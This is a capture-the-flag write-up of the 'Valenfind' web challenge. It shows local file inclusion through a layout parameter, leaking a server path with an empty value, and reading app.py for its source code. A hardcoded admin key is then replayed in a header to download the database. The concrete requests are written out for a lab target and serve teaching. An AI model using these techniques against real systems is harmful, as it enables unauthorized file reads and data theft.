Valenfind

Web Medium Feb 2026

Enumeration

Starting by exploring the web application and intercepting traffic with Burp Suite, I quickly spotted an interesting endpoint: 

GET /api/fetch_layout?layout=theme_classic.html

The layout parameter looked injectable — it seemed to be fetching a file server-side. Classic LFI candidate.

I also noticed a useful header in every response: 

Server: Werkzeug/3.0.1 Python/3.12.3

Python backend confirmed. This is relevant for knowing which config files to target later.

LFI ( local file inclusion )

First reflex: replace the parameter value with /etc/passwd. No output. I spent about 10 minutes fuzzing different paths and payloads, then tried something different — sending an empty value. 

GET /api/fetch_layout?layout=
Tips : Sending an empty parameter instead of a payload can sometimes leak backend info — here it revealed the full internal directory structure. 
/opt/Valenfind/templates/components

Now I had the full server path. From here, I started fetching known Python app files since I knew the backend was Python.

Source Code Disclosure

Using the leaked base path, I walked up the directory tree and tried common filenames: 

GET /api/fetch_layout?layout=/opt/Valenfind/app.py

The full source code of the application leaked. Inside app.py, two things caught my eye immediately.

First, a hardcoded API key:

ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"

Second, a protected admin route:

@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    if auth_header == ADMIN_API_KEY:
        try:
            return send_file(DATABASE, as_attachment=True,
                             download_name='valenfind_leak.db')
        except Exception as e:
            return str(e)
    else:
        return jsonify({"error": "Forbidden"}), 403

Exploiting the Admin Endpoint

The logic is straightforward: hit /api/admin/export_db with the right token in the X-Valentine-Token header. Back in Burp Suite: 

GET /api/admin/export_db HTTP/1.1
Host: <host>
X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO

The server responded with a database file download: valenfind_leak.db. Opening it revealed the flag.

Summary

The attack chain was: LFI via empty parameter → leaked internal path → source code disclosure via app.py → hardcoded admin key → authenticated DB export.

The key finding was that an empty parameter triggered a directory listing instead of an error — something easy to miss if you jump straight to classic traversal payloads. Always test edge cases.
